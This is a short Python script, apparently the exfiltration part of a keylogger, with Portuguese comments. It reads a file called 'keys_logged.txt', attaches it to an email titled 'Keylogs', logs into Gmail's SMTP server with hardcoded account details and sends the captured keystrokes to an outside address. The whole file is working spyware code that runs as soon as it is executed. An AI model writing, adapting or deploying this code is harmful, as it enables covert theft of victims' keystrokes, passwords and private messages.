import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders


def new_emailer():

    msg = MIMEMultipart()
    msg['Subject'] = "Keylogs"
    msg['From'] = "botmailbot01@gmail.com"
    msg['To'] = "send_to@email.com"

    part = MIMEBase('application', 'octet-stream')
    part.set_payload(open('keys_logged.txt', 'rb').read())
    encoders.encode_base64(part)

    part.add_header('Content-Disposition','attachment; filename="keys_logged.txt"')

    msg.attach(part)

    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    #Senhas e permissoes para o email que vai enviar as mensagens
    server.login("botmailbot01@gmail.com","password")
    #Enviar o email
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    #Desconectar do servidor
    server.quit()
    print ("Sent")

new_emailer()
